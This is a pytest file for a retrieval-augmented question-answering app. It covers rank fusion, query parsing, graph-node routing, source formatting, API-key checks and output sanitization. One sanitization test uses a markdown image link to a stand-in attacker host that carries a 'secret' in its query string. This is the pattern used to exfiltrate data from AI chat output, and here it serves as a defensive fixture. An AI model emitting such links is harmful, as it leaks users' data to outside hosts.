from types import SimpleNamespace

from langchain_core.documents import Document

import agents.graph as graph
from retrieval.query_transform import parse_query_lines
from retrieval.retriever import HybridRetriever


def _doc(content: str, **metadata) -> Document:
    return Document(page_content=content, metadata=metadata)


class TestReciprocalRankFusion:
    def test_fuses_and_deduplicates(self):
        a = _doc("alpha", source="x.pdf", page=1)
        b = _doc("beta", source="x.pdf", page=2)
        c = _doc("gamma", source="y.pdf", page=1)

        fused = HybridRetriever._reciprocal_rank_fusion([[a, b], [b, c]])

        contents = [d.page_content for d in fused]
        assert sorted(contents) == ["alpha", "beta", "gamma"]
        # b appears in both lists, so it must rank first
        assert fused[0].page_content == "beta"

    def test_empty_input(self):
        assert HybridRetriever._reciprocal_rank_fusion([[], []]) == []


class TestParseQueryLines:
    def test_strips_numbering_and_bullets(self):
        text = "1. What is RAG?\n- How does RAG work?\n* Explain RAG, please"
        assert parse_query_lines(text) == [
            "What is RAG?",
            "How does RAG work?",
            "Explain RAG, please",
        ]

    def test_keeps_commas_within_a_question(self):
        text = "What are chunking, embedding, and retrieval?"
        assert parse_query_lines(text) == ["What are chunking, embedding, and retrieval?"]

    def test_skips_blank_lines(self):
        assert parse_query_lines("\n  \nOnly question\n") == ["Only question"]


class TestGraphNodes:
    def test_web_search_node_returns_only_new_step(self, monkeypatch):
        results = [_doc("web result", url="http://example.com")]
        monkeypatch.setattr(graph, "web_search", lambda q, s: results)

        state = {
            "question": "q",
            "rewritten_question": "",
            "documents": [],
            "retries": 0,
            "steps": ["retrieve", "transform_query"],
        }
        update = graph.web_search_node(state, settings=SimpleNamespace())

        # The steps reducer concatenates, so nodes must emit only their own step
        assert update["steps"] == ["web_search"]
        assert update["documents"] == results

    def test_transform_query_increments_retries(self, monkeypatch):
        fake_model = SimpleNamespace(invoke=lambda prompt: SimpleNamespace(content="better question"))
        monkeypatch.setattr(graph, "get_llm", lambda provider, model: fake_model)

        settings = SimpleNamespace(llm_provider="google", llm_model="m")
        update = graph.transform_query({"question": "q", "retries": 1, "steps": []}, settings)

        assert update["retries"] == 2
        assert update["rewritten_question"] == "better question"
        assert update["steps"] == ["transform_query"]

    def test_grade_documents_web_fallback_is_opt_in(self, monkeypatch):
        monkeypatch.setattr(graph, "grade_documents", lambda q, d, s: "no")
        state = {"question": "q", "rewritten_question": "", "documents": [_doc("d")], "retries": 2}

        # Budget exhausted: web search only when explicitly enabled, else
        # best-effort generation from local documents.
        enabled = SimpleNamespace(max_retries=2, enable_web_search=True)
        assert graph.grade_documents_node(state, enabled) == "web_search"

        disabled = SimpleNamespace(max_retries=2, enable_web_search=False)
        assert graph.grade_documents_node(state, disabled) == "generate"

        # Budget remaining: keep refining the query regardless of the toggle.
        state["retries"] = 0
        assert graph.grade_documents_node(state, disabled) == "transform_query"

    def test_grade_generation_caps_regeneration(self, monkeypatch):
        monkeypatch.setattr(graph, "grade_hallucination", lambda d, g, s: "no")
        settings = SimpleNamespace(max_retries=2)

        state = {
            "question": "q",
            "documents": [],
            "generation": "answer",
            "retries": 0,
            "steps": ["generate"] * 3,
        }
        assert graph.grade_generation(state, settings) == "useful"

        state["steps"] = ["generate"]
        assert graph.grade_generation(state, settings) == "not_supported"


class TestFormatSource:
    def test_page_zero_is_included(self):
        assert "Page 0" in graph.format_source(_doc("d", source="a.pdf", page=0))

    def test_web_url_wins(self):
        assert graph.format_source(_doc("d", url="http://e.com")).startswith("Web:")


class TestHasRequiredKeys:
    def _settings(self, provider, **keys):
        return SimpleNamespace(
            llm_provider=provider,
            embedding_provider=provider,
            vision_provider=provider,
            google_api_key=keys.get("google_api_key"),
            openai_api_key=keys.get("openai_api_key"),
            aws_access_key_id=keys.get("aws_access_key_id"),
            aws_secret_access_key=keys.get("aws_secret_access_key"),
        )

    def test_google_requires_google_key(self):
        from ui.streamlit_app import _has_required_keys

        assert _has_required_keys(self._settings("google", google_api_key="key"))
        assert not _has_required_keys(self._settings("google", openai_api_key="openai-key"))

    def test_bedrock_requires_both_aws_keys(self):
        from ui.streamlit_app import _has_required_keys

        assert _has_required_keys(
            self._settings("bedrock", aws_access_key_id="id", aws_secret_access_key="secret")
        )
        assert not _has_required_keys(self._settings("bedrock", aws_access_key_id="id"))


class TestSanitizeResponse:
    def test_strips_markdown_images(self):
        from ui.streamlit_app import _sanitize_response

        malicious = "Here is the answer ![x](https://attacker.example/?d=secret)"
        out = _sanitize_response(malicious)
        assert "attacker.example" not in out
        assert "[image removed]" in out

    def test_keeps_normal_links_and_text(self):
        from ui.streamlit_app import _sanitize_response

        text = "See [the source](https://example.com) for details."
        assert _sanitize_response(text) == text
